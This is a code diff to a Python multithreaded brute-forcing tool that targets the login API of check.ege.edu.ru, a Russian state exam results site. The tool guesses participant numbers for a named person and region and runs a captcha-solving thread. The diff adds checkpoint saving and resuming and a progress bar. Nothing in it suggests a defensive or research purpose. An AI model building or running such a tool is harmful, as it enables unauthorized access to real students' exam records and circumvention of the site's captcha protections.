@@ -6,8 +6,10 @@ import logging
 from random import shuffle
 from base64 import decodebytes
 from threading import Thread, Condition, Event, Lock
-from queue import Queue
+from queue import Queue, Empty
+import pickle
 import requests
+from tqdm import tqdm
 
 # TODO: logging
 # TODO: exceptions
@@ -17,6 +19,13 @@ import requests
 BASE_URL = 'http://check.ege.edu.ru/'
 API_CAPTCHA = f'{BASE_URL}api/captcha'
 API_LOGIN = f'{BASE_URL}api/participant/login'
+
+
+def queue_list(q):
+    try:
+        yield q.get(False)
+    except Empty:
+        pass
 
 
 class Bruter:
@@ -44,6 +53,9 @@ class Bruter:
 
         self.captcha_died.set()
 
+        self.progressbar_lock = Lock()
+        self.bar = tqdm(total=10**6)
+
     def brute(self):
         while not self.queue.empty() and not self.bruted.is_set():
 
@@ -70,7 +82,10 @@ class Bruter:
                 self.bruted.set()
                 self.captcha_died.set()  # Signal captcha thread not to wait
             elif r.text == '"Участник не найден"' and r.status_code == 401:
-                print(f'Bad:{number}')
+                # print(f'Bad:{number}')
+                with self.progressbar_lock:
+                    self.bar.update()
+                    self.bar.write(f'[BAD] {number}')
             elif r.text == '"Пожалуйста, проверьте правильность введённого кода с картинки"' and r.status_code == 400:
                 print('Captcha died')
                 self.captcha_died.set()
@@ -95,6 +110,8 @@ class Bruter:
             self.bruted.set()
             for thread in threads:
                 thread.join()
+            print('Saving progress...')
+            self.save_progress()
         # captcha_thread.join()
 
     def captcha_solver(self):
@@ -164,24 +181,46 @@ class Bruter:
                            .encode('utf-8'))\
             .hexdigest()
 
+    def save_progress(self):
+        # TODO: queue_list doesn't work: yields only once
+        l = [item for item in queue_list(self.queue)]
+
+        with open(f'{self.hash}.cpt', 'wb') as f:
+            pickle.dump(l, f, pickle.HIGHEST_PROTOCOL)
+
+    def load_progress(self, filename):
+        with open(filename, 'rb') as f:
+            l = pickle.load(f)
+        with self.queue.mutex:
+            self.queue.queue.clear()
+        for item in l:
+            self.queue.put(item)
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('dictionary', type=str)
+    parser.add_argument('fio', type=str)
     parser.add_argument('-r', '--region', type=int,
                         required=True, help='region')
     parser.add_argument('-t', '--threads', type=int,
                         default=4, help='number of threads')
+    parser.add_argument('-c', '--checkpoint', type=str,
+                        default=None, help='start bruting from a checkpoint')
     args = parser.parse_args()
+    print(args)
 
+    # try:
+    #     fio_list = open(args.dictionary).readlines()
+    # except FileNotFoundError:
+    #     print('Dictionary file not found')
+    #     os._exit(1)
     try:
-        fio_list = open(args.dictionary).readlines()
-    except FileNotFoundError:
-        print('Dictionary file not found')
-        os._exit(1)
-    try:
-        for fio in fio_list:
-            bruter = Bruter(fio, args.region)
-            bruter.start(args.threads)
-    except Exception:
+        # for fio in fio_list:
+        #     bruter = Bruter(fio, args.region)
+        #     bruter.start(args.threads)
+        bruter = Bruter(args.fio, args.region)
+        if args.checkpoint != None:
+            bruter.load_progress(args.checkpoint)
+        bruter.start(args.threads)
+    except KeyboardInterrupt:
         os._exit(2)
